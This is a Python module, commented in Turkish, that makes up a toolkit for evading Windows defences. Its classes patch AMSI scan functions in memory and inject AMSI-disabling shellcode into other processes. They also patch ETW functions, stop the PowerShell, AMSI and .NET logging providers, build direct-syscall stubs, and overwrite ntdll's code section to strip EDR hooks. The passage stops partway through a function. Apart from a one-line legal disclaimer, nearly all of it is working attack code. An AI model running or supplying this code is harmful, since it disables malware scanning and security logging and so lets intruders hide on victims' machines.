"""
AMSI & ETW Bypass Katmanı
=========================
2025-2026 Trend: Indirect syscalls + API unhooking (SysWhispers3 style)

Teknikler:
- AMSI: AmsiOpenSession patch, memory patch, remote injection
- ETW: Provider disable, NtTraceEvent patch
- Syscalls: Indirect syscalls via ntdll.dll mapping
- Unhooking: Restore original ntdll from disk

Referanslar:
- boku7/injectAmsiBypass
- SysWhispers3
- Outflank/Dumpert

⚠️ YASAL UYARI: Bu modül sadece yetkili penetrasyon testleri içindir.
"""

from __future__ import annotations
import os
import ctypes
import struct
import hashlib
import base64
import random
import string
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Tuple, Any
from enum import Enum, auto
import logging

logger = logging.getLogger("bypass_amsi_etw")


# ============================================================
# ENUM & DATA CLASSES
# ============================================================

class BypassLayer(Enum):
    """Bypass katman seçenekleri"""
    NONE = "none"
    AMSI = "amsi"
    ETW = "etw"
    BOTH = "both"


class BypassMethod(Enum):
    """Bypass yöntemi"""
    MEMORY_PATCH = auto()           # Direct memory patching
    HARDWARE_BP = auto()            # Hardware breakpoint (VEH)
    REMOTE_INJECTION = auto()       # Remote process injection
    INDIRECT_SYSCALL = auto()       # SysWhispers3 style
    API_UNHOOK = auto()             # ntdll restoration
    PROVIDER_DISABLE = auto()       # ETW provider disable


@dataclass
class SyscallEntry:
    """Syscall bilgisi"""
    name: str
    ssn: int  # System Service Number
    address: int = 0
    is_hooked: bool = False


@dataclass
class BypassResult:
    """Bypass işlem sonucu"""
    success: bool
    method: BypassMethod
    target: str
    details: str = ""
    detection_risk: int = 50
    artifacts: List[str] = field(default_factory=list)


@dataclass
class DefenseAnalysis:
    """Savunma analiz sonucu"""
    amsi_present: bool = False
    amsi_version: str = ""
    amsi_hooked: bool = False
    etw_enabled: bool = False
    etw_providers: List[str] = field(default_factory=list)
    edr_detected: List[str] = field(default_factory=list)
    kernel_callbacks: List[str] = field(default_factory=list)
    recommended_bypass: BypassLayer = BypassLayer.NONE
    risk_score: int = 50
    notes: List[str] = field(default_factory=list)


# ============================================================
# SYSCALL TABLE (Windows 10/11 22H2 - 2025/2026)
# ============================================================

SYSCALL_TABLE_WIN11 = {
    "NtAllocateVirtualMemory": 0x18,
    "NtProtectVirtualMemory": 0x50,
    "NtWriteVirtualMemory": 0x3A,
    "NtCreateThreadEx": 0xC7,
    "NtOpenProcess": 0x26,
    "NtClose": 0x0F,
    "NtQueryInformationProcess": 0x19,
    "NtReadVirtualMemory": 0x3F,
    "NtTraceEvent": 0x5D,  # ETW için
    "NtQuerySystemInformation": 0x36,
    "NtMapViewOfSection": 0x28,
    "NtUnmapViewOfSection": 0x2A,
    "NtQueueApcThread": 0x45,
    "NtAlertResumeThread": 0x2B,
    "NtWaitForSingleObject": 0x04,
}

# AMSI.dll patch bytes
AMSI_PATCH_BYTES = {
    "amsi_open_session": bytes([0x31, 0xC0, 0xC3]),  # xor eax,eax; ret
    "amsi_scan_buffer": bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]),  # mov eax, 0x80070057; ret (E_INVALIDARG)
    "amsi_scan_string": bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]),
}

# ETW patch
ETW_PATCH_BYTES = bytes([0xC3])  # ret (NtTraceEvent için)


# ============================================================
# AMSI BYPASS ENGINE
# ============================================================

class AMSIBypass:
    """
    AMSI (Antimalware Scan Interface) Bypass Engine
    
    Yöntemler:
    1. AmsiOpenSession patch - Session açılmasını engelle
    2. AmsiScanBuffer patch - Tarama fonksiyonunu bypass et
    3. Remote injection - Başka process'e enjekte et
    4. Hardware breakpoint - VEH ile bypass
    """
    
    def __init__(self, method: BypassMethod = BypassMethod.MEMORY_PATCH):
        self.method = method
        self.patched = False
        self.original_bytes: Dict[str, bytes] = {}
        self._amsi_dll = None
        
    def detect_amsi(self) -> Tuple[bool, str]:
        """AMSI varlığını ve versiyonunu tespit et"""
        try:
            # Windows'ta amsi.dll kontrolü
            import ctypes.wintypes
            
            amsi = ctypes.windll.LoadLibrary("amsi.dll")
            if amsi:
                # Version bilgisi al
                version = "Unknown"
                try:
                    import subprocess
                    result = subprocess.run(
                        ["powershell", "-c", "(Get-Item C:\\Windows\\System32\\amsi.dll).VersionInfo.FileVersion"],
                        capture_output=True, text=True, timeout=5
                    )
                    if result.returncode == 0:
                        version = result.stdout.strip()
                except:
                    pass
                    
                return True, version
        except OSError:
            pass
        except Exception as e:
            logger.debug(f"AMSI detect error: {e}")
            
        return False, ""
    
    def check_amsi_hooks(self) -> bool:
        """AMSI hook'larını kontrol et (EDR)"""
        try:
            # AmsiScanBuffer'ın ilk byte'larını kontrol et
            # Normal: 4C 8B DC (mov r11, rsp)
            # Hooked: E9 xx xx xx xx (jmp) veya FF 25 (jmp [rip+offset])
            
            amsi = ctypes.windll.LoadLibrary("amsi.dll")
            amsi_scan = ctypes.cast(
                ctypes.windll.kernel32.GetProcAddress(amsi._handle, b"AmsiScanBuffer"),
                ctypes.POINTER(ctypes.c_ubyte)
            )
            
            first_byte = amsi_scan[0]
            
            # JMP opcode'ları (hook göstergesi)
            if first_byte in [0xE9, 0xFF, 0xEB]:
                return True
                
        except Exception as e:
            logger.debug(f"AMSI hook check error: {e}")
            
        return False
    
    def patch_amsi_open_session(self) -> BypassResult:
        """AmsiOpenSession'ı patch et"""
        try:
            amsi = ctypes.windll.LoadLibrary("amsi.dll")
            amsi_open = ctypes.windll.kernel32.GetProcAddress(amsi._handle, b"AmsiOpenSession")
            
            if not amsi_open:
                return BypassResult(False, self.method, "AmsiOpenSession", "Function not found")
            
            # Original bytes'ı kaydet
            original = (ctypes.c_ubyte * 3)()
            ctypes.memmove(original, amsi_open, 3)
            self.original_bytes["AmsiOpenSession"] = bytes(original)
            
            # Patch uygula
            patch = AMSI_PATCH_BYTES["amsi_open_session"]
            old_protect = ctypes.c_ulong()
            
            ctypes.windll.kernel32.VirtualProtect(
                amsi_open, len(patch), 0x40, ctypes.byref(old_protect)  # PAGE_EXECUTE_READWRITE
            )
            
            ctypes.memmove(amsi_open, patch, len(patch))
            
            ctypes.windll.kernel32.VirtualProtect(
                amsi_open, len(patch), old_protect.value, ctypes.byref(old_protect)
            )
            
            self.patched = True
            
            return BypassResult(
                success=True,
                method=BypassMethod.MEMORY_PATCH,
                target="AmsiOpenSession",
                details="Patched with xor eax,eax; ret",
                detection_risk=35,
                artifacts=["amsi.dll memory modified"]
            )
            
        except Exception as e:
            return BypassResult(False, self.method, "AmsiOpenSession", str(e))
    
    def patch_amsi_scan_buffer(self) -> BypassResult:
        """AmsiScanBuffer'ı patch et - Daha etkili"""
        try:
            amsi = ctypes.windll.LoadLibrary("amsi.dll")
            amsi_scan = ctypes.windll.kernel32.GetProcAddress(amsi._handle, b"AmsiScanBuffer")
            
            if not amsi_scan:
                return BypassResult(False, self.method, "AmsiScanBuffer", "Function not found")
            
            # Original bytes
            original = (ctypes.c_ubyte * 6)()
            ctypes.memmove(original, amsi_scan, 6)
            self.original_bytes["AmsiScanBuffer"] = bytes(original)
            
            # Patch: E_INVALIDARG döndür
            patch = AMSI_PATCH_BYTES["amsi_scan_buffer"]
            old_protect = ctypes.c_ulong()
            
            ctypes.windll.kernel32.VirtualProtect(
                amsi_scan, len(patch), 0x40, ctypes.byref(old_protect)
            )
            
            ctypes.memmove(amsi_scan, patch, len(patch))
            
            ctypes.windll.kernel32.VirtualProtect(
                amsi_scan, len(patch), old_protect.value, ctypes.byref(old_protect)
            )
            
            self.patched = True
            
            return BypassResult(
                success=True,
                method=BypassMethod.MEMORY_PATCH,
                target="AmsiScanBuffer",
                details="Patched to return E_INVALIDARG (0x80070057)",
                detection_risk=40,
                artifacts=["amsi.dll!AmsiScanBuffer patched"]
            )
            
        except Exception as e:
            return BypassResult(False, self.method, "AmsiScanBuffer", str(e))
    
    def remote_amsi_injection(self, pid: int) -> BypassResult:
        """
        Remote process'e AMSI bypass enjekte et
        boku7/injectAmsiBypass tekniği
        """
        try:
            # Shellcode: AMSI patch
            shellcode = self._generate_amsi_patch_shellcode()
            
            # Process aç
            PROCESS_ALL_ACCESS = 0x1F0FFF
            h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            
            if not h_process:
                return BypassResult(False, BypassMethod.REMOTE_INJECTION, f"PID:{pid}", "Failed to open process")
            
            try:
                # Memory allocate
                MEM_COMMIT = 0x1000
                MEM_RESERVE = 0x2000
                PAGE_EXECUTE_READWRITE = 0x40
                
                remote_mem = ctypes.windll.kernel32.VirtualAllocEx(
                    h_process, 0, len(shellcode),
                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
                )
                
                if not remote_mem:
                    return BypassResult(False, BypassMethod.REMOTE_INJECTION, f"PID:{pid}", "VirtualAllocEx failed")
                
                # Write shellcode
                written = ctypes.c_size_t()
                ctypes.windll.kernel32.WriteProcessMemory(
                    h_process, remote_mem, shellcode, len(shellcode), ctypes.byref(written)
                )
                
                # Create remote thread
                thread_id = ctypes.c_ulong()
                h_thread = ctypes.windll.kernel32.CreateRemoteThread(
                    h_process, None, 0, remote_mem, None, 0, ctypes.byref(thread_id)
                )
                
                if h_thread:
                    ctypes.windll.kernel32.WaitForSingleObject(h_thread, 5000)
                    ctypes.windll.kernel32.CloseHandle(h_thread)
                    
                    return BypassResult(
                        success=True,
                        method=BypassMethod.REMOTE_INJECTION,
                        target=f"PID:{pid}",
                        details=f"AMSI patch injected to process {pid}",
                        detection_risk=55,
                        artifacts=[
                            f"Remote memory allocated in PID {pid}",
                            "CreateRemoteThread called",
                            "amsi.dll modified in target"
                        ]
                    )
                    
            finally:
                ctypes.windll.kernel32.CloseHandle(h_process)
                
        except Exception as e:
            return BypassResult(False, BypassMethod.REMOTE_INJECTION, f"PID:{pid}", str(e))
        
        return BypassResult(False, BypassMethod.REMOTE_INJECTION, f"PID:{pid}", "Unknown error")
    
    def _generate_amsi_patch_shellcode(self) -> bytes:
        """AMSI patch shellcode üret (x64)"""
        # GetProcAddress + patch shellcode
        # Simplified - gerçek implementasyonda dinamik olmalı
        shellcode = bytes([
            # Prologue
            0x48, 0x83, 0xEC, 0x28,  # sub rsp, 0x28
            
            # LoadLibrary("amsi.dll")
            0x48, 0x8D, 0x0D, 0x50, 0x00, 0x00, 0x00,  # lea rcx, [rip+0x50] ; "amsi.dll"
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # mov rax, LoadLibraryA
            0xFF, 0xD0,  # call rax
            
            # GetProcAddress(amsi, "AmsiScanBuffer")
            0x48, 0x89, 0xC1,  # mov rcx, rax
            0x48, 0x8D, 0x15, 0x40, 0x00, 0x00, 0x00,  # lea rdx, [rip+0x40] ; "AmsiScanBuffer"
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # mov rax, GetProcAddress
            0xFF, 0xD0,  # call rax
            
            # VirtualProtect + patch
            0x48, 0x89, 0xC1,  # mov rcx, rax (AmsiScanBuffer addr)
            0x48, 0xC7, 0xC2, 0x06, 0x00, 0x00, 0x00,  # mov rdx, 6 (size)
            0x41, 0xB8, 0x40, 0x00, 0x00, 0x00,  # mov r8d, 0x40 (PAGE_EXECUTE_READWRITE)
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # mov rax, VirtualProtect
            0xFF, 0xD0,  # call rax
            
            # Write patch bytes
            0xC6, 0x01, 0xB8,  # mov byte [rcx], 0xB8
            0xC6, 0x41, 0x01, 0x57,  # mov byte [rcx+1], 0x57
            0xC6, 0x41, 0x02, 0x00,  # mov byte [rcx+2], 0x00
            0xC6, 0x41, 0x03, 0x07,  # mov byte [rcx+3], 0x07
            0xC6, 0x41, 0x04, 0x80,  # mov byte [rcx+4], 0x80
            0xC6, 0x41, 0x05, 0xC3,  # mov byte [rcx+5], 0xC3
            
            # Epilogue
            0x48, 0x83, 0xC4, 0x28,  # add rsp, 0x28
            0xC3,  # ret
            
            # Strings
            0x61, 0x6D, 0x73, 0x69, 0x2E, 0x64, 0x6C, 0x6C, 0x00,  # "amsi.dll"
            0x41, 0x6D, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6E, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72, 0x00,  # "AmsiScanBuffer"
        ])
        
        return shellcode
    
    def restore_amsi(self) -> bool:
        """AMSI'yı orijinal haline getir"""
        try:
            if not self.patched or not self.original_bytes:
                return False
                
            amsi = ctypes.windll.LoadLibrary("amsi.dll")
            
            for func_name, original in self.original_bytes.items():
                func_addr = ctypes.windll.kernel32.GetProcAddress(amsi._handle, func_name.encode())
                if func_addr:
                    old_protect = ctypes.c_ulong()
                    ctypes.windll.kernel32.VirtualProtect(
                        func_addr, len(original), 0x40, ctypes.byref(old_protect)
                    )
                    ctypes.memmove(func_addr, original, len(original))
                    ctypes.windll.kernel32.VirtualProtect(
                        func_addr, len(original), old_protect.value, ctypes.byref(old_protect)
                    )
                    
            self.patched = False
            self.original_bytes.clear()
            return True
            
        except Exception as e:
            logger.error(f"AMSI restore error: {e}")
            return False
    
    def bypass(self, aggressive: bool = False) -> BypassResult:
        """Ana bypass fonksiyonu"""
        if self.method == BypassMethod.MEMORY_PATCH:
            if aggressive:
                # Hem AmsiOpenSession hem AmsiScanBuffer
                r1 = self.patch_amsi_open_session()
                r2 = self.patch_amsi_scan_buffer()
                return BypassResult(
                    success=r1.success or r2.success,
                    method=BypassMethod.MEMORY_PATCH,
                    target="AMSI",
                    details=f"OpenSession: {r1.success}, ScanBuffer: {r2.success}",
                    detection_risk=max(r1.detection_risk, r2.detection_risk),
                    artifacts=r1.artifacts + r2.artifacts
                )
            else:
                return self.patch_amsi_scan_buffer()
        else:
            return self.patch_amsi_scan_buffer()


# ============================================================
# ETW BYPASS ENGINE
# ============================================================

class ETWBypass:
    """
    ETW (Event Tracing for Windows) Bypass Engine
    
    Yöntemler:
    1. NtTraceEvent patch - ETW fonksiyonunu bypass
    2. Provider disable - Belirli provider'ları kapat
    3. EtwEventWrite patch - Event yazımını engelle
    """
    
    # Önemli ETW Provider GUID'leri
    ETW_PROVIDERS = {
        "Microsoft-Windows-PowerShell": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
        "Microsoft-Windows-Kernel-Process": "{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}",
        "Microsoft-Windows-Kernel-File": "{EDD08927-9CC4-4E65-B970-C2560FB5C289}",
        "Microsoft-Antimalware-Scan-Interface": "{2A576B87-09A7-520E-C21A-4942F0271D67}",
        "Microsoft-Windows-DotNETRuntime": "{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}",
        "Microsoft-Windows-Threat-Intelligence": "{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}",
    }
    
    def __init__(self, method: BypassMethod = BypassMethod.MEMORY_PATCH):
        self.method = method
        self.patched = False
        self.original_bytes: Dict[str, bytes] = {}
        self.disabled_providers: List[str] = []
        
    def detect_etw(self) -> Tuple[bool, List[str]]:
        """ETW durumunu ve aktif provider'ları tespit et"""
        active_providers = []
        
        try:
            import subprocess
            
            # PowerShell ETW providers listele
            result = subprocess.run(
                ["powershell", "-c", "Get-EtwTraceProvider | Select-Object -First 20 | ForEach-Object { $_.Guid }"],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    guid = line.strip()
                    if guid:
                        # Bilinen provider mı?
                        for name, known_guid in self.ETW_PROVIDERS.items():
                            if guid.upper() == known_guid.upper().strip('{}'):
                                active_providers.append(name)
                                break
                        else:
                            active_providers.append(guid[:16] + "...")
                            
            return len(active_providers) > 0, active_providers
            
        except Exception as e:
            logger.debug(f"ETW detect error: {e}")
            
        return False, []
    
    def patch_nt_trace_event(self) -> BypassResult:
        """NtTraceEvent'i patch et (ntdll.dll)"""
        try:
            ntdll = ctypes.windll.ntdll
            nt_trace = ctypes.windll.kernel32.GetProcAddress(ntdll._handle, b"NtTraceEvent")
            
            if not nt_trace:
                # EtwEventWrite dene
                nt_trace = ctypes.windll.kernel32.GetProcAddress(ntdll._handle, b"EtwEventWrite")
                
            if not nt_trace:
                return BypassResult(False, self.method, "NtTraceEvent", "Function not found")
            
            # Original byte kaydet
            original = (ctypes.c_ubyte * 1)()
            ctypes.memmove(original, nt_trace, 1)
            self.original_bytes["NtTraceEvent"] = bytes(original)
            
            # Patch: ret (0xC3)
            old_protect = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtect(
                nt_trace, 1, 0x40, ctypes.byref(old_protect)
            )
            
            ctypes.memmove(nt_trace, ETW_PATCH_BYTES, 1)
            
            ctypes.windll.kernel32.VirtualProtect(
                nt_trace, 1, old_protect.value, ctypes.byref(old_protect)
            )
            
            self.patched = True
            
            return BypassResult(
                success=True,
                method=BypassMethod.MEMORY_PATCH,
                target="NtTraceEvent",
                details="Patched with ret (0xC3)",
                detection_risk=45,
                artifacts=["ntdll.dll!NtTraceEvent patched"]
            )
            
        except Exception as e:
            return BypassResult(False, self.method, "NtTraceEvent", str(e))
    
    def patch_etw_event_write(self) -> BypassResult:
        """EtwEventWrite'ı patch et"""
        try:
            ntdll = ctypes.windll.ntdll
            etw_write = ctypes.windll.kernel32.GetProcAddress(ntdll._handle, b"EtwEventWrite")
            
            if not etw_write:
                return BypassResult(False, self.method, "EtwEventWrite", "Function not found")
            
            original = (ctypes.c_ubyte * 1)()
            ctypes.memmove(original, etw_write, 1)
            self.original_bytes["EtwEventWrite"] = bytes(original)
            
            old_protect = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtect(
                etw_write, 1, 0x40, ctypes.byref(old_protect)
            )
            
            ctypes.memmove(etw_write, ETW_PATCH_BYTES, 1)
            
            ctypes.windll.kernel32.VirtualProtect(
                etw_write, 1, old_protect.value, ctypes.byref(old_protect)
            )
            
            self.patched = True
            
            return BypassResult(
                success=True,
                method=BypassMethod.MEMORY_PATCH,
                target="EtwEventWrite",
                details="Patched with ret (0xC3)",
                detection_risk=40,
                artifacts=["ntdll.dll!EtwEventWrite patched"]
            )
            
        except Exception as e:
            return BypassResult(False, self.method, "EtwEventWrite", str(e))
    
    def disable_provider(self, provider_name: str) -> BypassResult:
        """Belirli ETW provider'ı devre dışı bırak"""
        try:
            guid = self.ETW_PROVIDERS.get(provider_name)
            if not guid:
                return BypassResult(False, BypassMethod.PROVIDER_DISABLE, provider_name, "Unknown provider")
            
            import subprocess
            
            # Admin gerekir
            cmd = f'logman stop "{provider_name}" -ets 2>$null; $true'
            result = subprocess.run(
                ["powershell", "-c", cmd],
                capture_output=True, text=True, timeout=10
            )
            
            self.disabled_providers.append(provider_name)
            
            return BypassResult(
                success=True,
                method=BypassMethod.PROVIDER_DISABLE,
                target=provider_name,
                details=f"Provider disabled: {guid}",
                detection_risk=30,
                artifacts=[f"ETW provider {provider_name} stopped"]
            )
            
        except Exception as e:
            return BypassResult(False, BypassMethod.PROVIDER_DISABLE, provider_name, str(e))
    
    def disable_critical_providers(self) -> List[BypassResult]:
        """Kritik provider'ları devre dışı bırak"""
        results = []
        critical = [
            "Microsoft-Windows-PowerShell",
            "Microsoft-Antimalware-Scan-Interface",
            "Microsoft-Windows-DotNETRuntime",
        ]
        
        for provider in critical:
            results.append(self.disable_provider(provider))
            
        return results
    
    def restore_etw(self) -> bool:
        """ETW'yi orijinal haline getir"""
        try:
            if not self.patched or not self.original_bytes:
                return False
                
            ntdll = ctypes.windll.ntdll
            
            for func_name, original in self.original_bytes.items():
                func_addr = ctypes.windll.kernel32.GetProcAddress(ntdll._handle, func_name.encode())
                if func_addr:
                    old_protect = ctypes.c_ulong()
                    ctypes.windll.kernel32.VirtualProtect(
                        func_addr, len(original), 0x40, ctypes.byref(old_protect)
                    )
                    ctypes.memmove(func_addr, original, len(original))
                    ctypes.windll.kernel32.VirtualProtect(
                        func_addr, len(original), old_protect.value, ctypes.byref(old_protect)
                    )
                    
            self.patched = False
            self.original_bytes.clear()
            return True
            
        except Exception as e:
            logger.error(f"ETW restore error: {e}")
            return False
    
    def bypass(self, full: bool = False) -> BypassResult:
        """Ana bypass fonksiyonu"""
        if full:
            r1 = self.patch_nt_trace_event()
            r2 = self.patch_etw_event_write()
            return BypassResult(
                success=r1.success or r2.success,
                method=BypassMethod.MEMORY_PATCH,
                target="ETW",
                details=f"NtTraceEvent: {r1.success}, EtwEventWrite: {r2.success}",
                detection_risk=max(r1.detection_risk, r2.detection_risk),
                artifacts=r1.artifacts + r2.artifacts
            )
        else:
            return self.patch_etw_event_write()


# ============================================================
# INDIRECT SYSCALL ENGINE (SysWhispers3 Style)
# ============================================================

class IndirectSyscall:
    """
    Indirect Syscall Engine - SysWhispers3 Style
    
    EDR hook'larını bypass etmek için:
    1. ntdll.dll'den syscall stub'ları oku
    2. SSN (System Service Number) hesapla
    3. Direkt syscall instruction kullan (int 2Eh / syscall)
    """
    
    def __init__(self):
        self.syscalls: Dict[str, SyscallEntry] = {}
        self.ntdll_base = 0
        self.initialized = False
        
    def initialize(self) -> bool:
        """Syscall tablosunu başlat"""
        try:
            # ntdll.dll base adresini al
            ntdll = ctypes.windll.ntdll
            self.ntdll_base = ntdll._handle
            
            # Syscall'ları çıkar
            for name, ssn in SYSCALL_TABLE_WIN11.items():
                func_addr = ctypes.windll.kernel32.GetProcAddress(self.ntdll_base, name.encode())
                
                is_hooked = False
                if func_addr:
                    # Hook kontrolü: ilk byte JMP mi?
                    first_byte = ctypes.cast(func_addr, ctypes.POINTER(ctypes.c_ubyte))[0]
                    if first_byte in [0xE9, 0xFF, 0xEB]:
                        is_hooked = True
                        
                self.syscalls[name] = SyscallEntry(
                    name=name,
                    ssn=ssn,
                    address=func_addr or 0,
                    is_hooked=is_hooked
                )
                
            self.initialized = True
            return True
            
        except Exception as e:
            logger.error(f"Syscall init error: {e}")
            return False
    
    def get_clean_syscall_stub(self, name: str) -> Optional[bytes]:
        """
        Temiz syscall stub'ı oluştur
        EDR hook varsa disk'ten ntdll oku
        """
        if name not in self.syscalls:
            return None
            
        entry = self.syscalls[name]
        
        if entry.is_hooked:
            # Disk'ten temiz ntdll oku
            return self._read_clean_syscall_from_disk(name, entry.ssn)
        else:
            # Direkt memory'den
            return self._read_syscall_stub(entry.address)
    
    def _read_syscall_stub(self, address: int) -> bytes:
        """Syscall stub'ını oku (23 bytes tipik)"""
        stub = (ctypes.c_ubyte * 23)()
        ctypes.memmove(stub, address, 23)
        return bytes(stub)
    
    def _read_clean_syscall_from_disk(self, name: str, ssn: int) -> bytes:
        """
        Disk'ten temiz ntdll oku ve syscall stub çıkar
        """
        try:
            ntdll_path = r"C:\Windows\System32\ntdll.dll"
            
            with open(ntdll_path, 'rb') as f:
                data = f.read()
                
            # PE parsing ile export tablosunu bul
            # Simplified - gerçek implementasyonda full PE parse gerekir
            
            # Generic syscall stub oluştur
            # mov r10, rcx
            # mov eax, SSN
            # syscall
            # ret
            stub = bytes([
                0x4C, 0x8B, 0xD1,  # mov r10, rcx
                0xB8, ssn & 0xFF, (ssn >> 8) & 0xFF, 0x00, 0x00,  # mov eax, SSN
                0x0F, 0x05,  # syscall
                0xC3,  # ret
            ])
            
            return stub
            
        except Exception as e:
            logger.error(f"Clean syscall read error: {e}")
            return bytes()
    
    def indirect_call(self, name: str, *args) -> int:
        """Indirect syscall yap"""
        if not self.initialized:
            self.initialize()
            
        stub = self.get_clean_syscall_stub(name)
        if not stub:
            return -1
            
        try:
            # Executable memory allocate
            MEM_COMMIT = 0x1000
            MEM_RESERVE = 0x2000
            PAGE_EXECUTE_READWRITE = 0x40
            
            stub_mem = ctypes.windll.kernel32.VirtualAlloc(
                0, len(stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            )
            
            if not stub_mem:
                return -1
                
            # Stub'ı yaz
            ctypes.memmove(stub_mem, stub, len(stub))
            
            # Function pointer oluştur ve çağır
            func_type = ctypes.CFUNCTYPE(ctypes.c_long)
            func = func_type(stub_mem)
            
            result = func()
            
            # Cleanup
            ctypes.windll.kernel32.VirtualFree(stub_mem, 0, 0x8000)  # MEM_RELEASE
            
            return result
            
        except Exception as e:
            logger.error(f"Indirect syscall error: {e}")
            return -1
    
    def get_hooked_functions(self) -> List[str]:
        """Hook'lanmış fonksiyonları listele"""
        return [name for name, entry in self.syscalls.items() if entry.is_hooked]


# ============================================================
# API UNHOOKING ENGINE
# ============================================================

class APIUnhooker:
    """
    API Unhooking Engine
    
    ntdll.dll'deki EDR hook'larını temizle:
    1. Disk'ten temiz ntdll.dll oku
    2. .text section'ı memory'dekinin üzerine yaz
    3. Tüm hook'lar temizlenir
    """
    
    def __init__(self):
        self.unhooked = False
        self.hooked_functions: List[str] = []
        
    def detect_hooks(self) -> List[str]:
        """ntdll.dll'deki hook'ları tespit et"""
        hooked = []
        
        try:
            ntdll = ctypes.windll.ntdll
            
            # Kritik fonksiyonları kontrol et
            functions = [
                "NtAllocateVirtualMemory",
                "NtProtectVirtualMemory",
                "NtWriteVirtualMemory",
                "NtCreateThreadEx",
                "NtOpenProcess",
                "NtReadVirtualMemory",
                "NtMapViewOfSection",
                "NtQueueApcThread",
            ]
            
            for func in functions:
                addr = ctypes.windll.kernel32.GetProcAddress(ntdll._handle, func.encode())
                if addr:
                    first_bytes = (ctypes.c_ubyte * 5)()
                    ctypes.memmove(first_bytes, addr, 5)
                    
                    # JMP opcodes
                    if first_bytes[0] in [0xE9, 0xFF, 0xEB]:
                        hooked.append(func)
                    # INT3 + JMP
                    elif first_bytes[0] == 0xCC:
                        hooked.append(func)
                        
            self.hooked_functions = hooked
            
        except Exception as e:
            logger.error(f"Hook detect error: {e}")
            
        return hooked
    
    def unhook_ntdll(self) -> BypassResult:
        """
        ntdll.dll'i disk'ten oku ve .text section'ı geri yükle
        """
        try:
            ntdll_path = r"C:\Windows\System32\ntdll.dll"
            
            # Disk'ten oku
            with open(ntdll_path, 'rb') as f:
                clean_ntdll = f.read()
                
            # PE parsing
            dos_header = struct.unpack_from('<H', clean_ntdll, 0)[0]
            if dos_header != 0x5A4D:  # MZ
                return BypassResult(False, BypassMethod.API_UNHOOK, "ntdll.dll", "Invalid PE")
                
            e_lfanew = struct.unpack_from('<I', clean_ntdll, 0x3C)[0]
            
            # Section headers
            optional_header_size = struct.unpack_from('<H', clean_ntdll, e_lfanew + 0x14)[0]
            section_offset = e_lfanew + 0x18 + optional_header_size
            num_sections = struct.unpack_from('<H', clean_ntdll, e_lfanew + 0x06)[0]
            
            # .text section bul
            text_section = None
            for i in range(num_sections):
                sec_offset = section_offset + (i * 40)
                name = clean_ntdll[sec_offset:sec_offset+8].rstrip(b'\x00')
                
                if name == b'.text':
                    virtual_size = struct.unpack_from('<I', clean_ntdll, sec_offset + 0x08)[0]
                    virtual_addr = struct.unpack_from('<I', clean_ntdll, sec_offset + 0x0C)[0]
                    raw_size = struct.unpack_from('<I', clean_ntdll, sec_offset + 0x10)[0]
                    raw_offset = struct.unpack_from('<I', clean_ntdll, sec_offset + 0x14)[0]
                    
                    text_section = {
                        'virtual_addr': virtual_addr,
                        'virtual_size': virtual_size,
                        'raw_offset': raw_offset,
                        'raw_size': raw_size
                    }
                    break
                    
            if not text_section:
                return BypassResult(False, BypassMethod.API_UNHOOK, "ntdll.dll", ".text section not found")
            
            # Memory'deki ntdll base
            ntdll = ctypes.windll.ntdll
            ntdll_base = ntdll._handle
            
            # .text section'ın memory adresi
            text_addr = ntdll_base + text_section['virtual_addr']
            
            # Clean .text section data
            clean_text = clean_ntdll[text_section['raw_offset']:text_section['raw_offset'] + text_section['raw_size']]
            
            # VirtualProtect ile yazılabilir yap
            old_protect = ctypes.c_ulong()
            result = ctypes.windll.kernel32.VirtualProtect(
                text_addr,
                text_section['virtual_size'],
                0x40,  # PAGE_EXECUTE_READWRITE
                ctypes.byref(old_protect)
            )
            
            if not result:
                return BypassResult(False, BypassMethod.API_UNHOOK, "ntdll.dll", "VirtualProtect failed")
            
            # Clean bytes yaz
            ctypes.memmove(text_addr, clean_text, len(clean_text))
            
            # Protection geri al
            ctypes.windll.kernel32.VirtualProtect(
                text_addr,
                text_section['virtual_size'],
                old_protect.value,
                ctypes.byref(old_protect)
            )
            
            self.unhooked = True
            
            return BypassResult(
                success=True,
                method=BypassMethod.API_UNHOOK,
                target="ntdll.dll",
                details=f"Restored .text section ({text_section['virtual_size']} bytes)",
                detection_risk=50,
                artifacts=[
                    "ntdll.dll .text section overwritten",
                    "VirtualProtect called on ntdll.dll"
                ]
            )
            
        except FileNotFoundError:
            return BypassResult(False, BypassMethod.API_UNHOOK, "ntdll.dll", "File not found")
        except Exception as e:
            return BypassResult(False, BypassMethod.API_UNHOOK, "ntdll.dll", str(e))
    
    def unhook_specific(self, function_name: str) -> BypassResult:
        """Belirli bir fonksiyonun hook'unu temizle"""
        try:
            ntdll_path = r"C:\Windows\System32\ntdll.dll"
            
            # Disk'ten clean stub oku
            with open(ntdll_path, 'rb') as f:
                clean_ntdll = f.read()
                
            # Memory'deki fonksiyon adresi
            ntdll = ctypes.windll.ntdll
            func_addr = ctypes.windll.kernel32.GetProcAddress(ntdll._handle, function_name.encode())
            
            if not func_addr:
                return BypassResult(False, BypassMethod.API_UNHOOK, function_name, "Function not found")
            
            # İlk 23 byte (syscall stub boyutu)
            stub_size = 23
            
            # Clean stub bul (simplified)
            ssn = SYSCALL_TABLE_WIN11.get(function_name, 0)
            clean_stub = bytes([
                0x4C, 0x8B, 0xD1,  # mov r10, rcx
                0xB8, ssn & 0xFF, (ssn >> 8) & 0xFF, 0x00, 0x00,  # mov eax, SSN
                0x0F, 0x05,  # syscall
                0xC3,  # ret
            ])
            
